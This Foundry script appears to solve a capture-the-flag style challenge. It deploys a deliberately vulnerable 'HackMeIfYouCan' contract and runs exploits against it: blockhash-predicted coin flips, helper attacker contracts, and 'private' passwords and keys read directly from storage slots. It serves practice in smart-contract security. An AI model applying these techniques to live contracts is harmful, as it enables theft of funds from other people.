// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.0;

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";
import {AddPointHack} from "../src/AddPointHack.sol";
import {Building} from "../src/Building.sol";

contract HackMeIfYouCanScript is Script {
    HackMeIfYouCan public hackMeIfYouCan;
    uint256 FACTOR =
        6275657625726723324896521676682367236752985978263786257989175917;

    function run() public {
        // Sepolia testnet address
        vm.startBroadcast();
        bytes32[15] memory _data = [
            bytes32(uint256(0x21)),
            bytes32(uint256(0x21)),
            bytes32(uint256(0x21)),
            bytes32(uint256(0x21)),
            bytes32(uint256(0x21)),
            bytes32(uint256(0x21)),
            bytes32(uint256(0x21)),
            bytes32(uint256(0x21)),
            bytes32(uint256(0x21)),
            bytes32(uint256(0x21)),
            bytes32(uint256(0x21)),
            bytes32(uint256(0x21)),
            bytes32(uint256(0x21)),
            bytes32(uint256(0x21)),
            bytes32(uint256(0x21))
        ];
        hackMeIfYouCan = new HackMeIfYouCan("test", _data);

        vm.stopBroadcast();

        // Hack flip function
        vm.startBroadcast(address(1));
        for (uint i = 0; i < 10; i++) {
            vm.roll(block.number + 1);
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            hackMeIfYouCan.flip(side);
        }

        // Hack addPoint function
        AddPointHack addPointHack = new AddPointHack(address(hackMeIfYouCan));
        addPointHack.attackAddPoint();

        // Hack transfer
        hackMeIfYouCan.transfer(address(0), 1);

        // Hack goTo function
        Building building = new Building(address(hackMeIfYouCan));
        building.goToHack(2000);

        // Hack sendKey function
        bytes32 dataValue = vm.load(
            address(hackMeIfYouCan),
            bytes32(uint256(16))
        );
        hackMeIfYouCan.sendKey(bytes16(dataValue));

        // Hack sendPassword function
        bytes32 password = vm.load(
            address(hackMeIfYouCan),
            bytes32(uint256(3))
        );
        hackMeIfYouCan.sendPassword(password);

        // Hack receive() callBack function
        vm.deal(address(1), 0.1 ether);
        hackMeIfYouCan.contribute{value: 0.0001 ether}();
        (bool success, ) = address(hackMeIfYouCan).call{value: 0.0001 ether}(
            ""
        );
        require(success, "Ether transfer failed");

        console.log("marks:", hackMeIfYouCan.getMarks(address(1)));
        vm.stopBroadcast();
    }
}

/* 
1. To load the .env in the shell:
-> source .env

2. To run the deploy script:
-> Local Simulation: forge script script/HackMeIfYouCanLocal.s.sol
*/
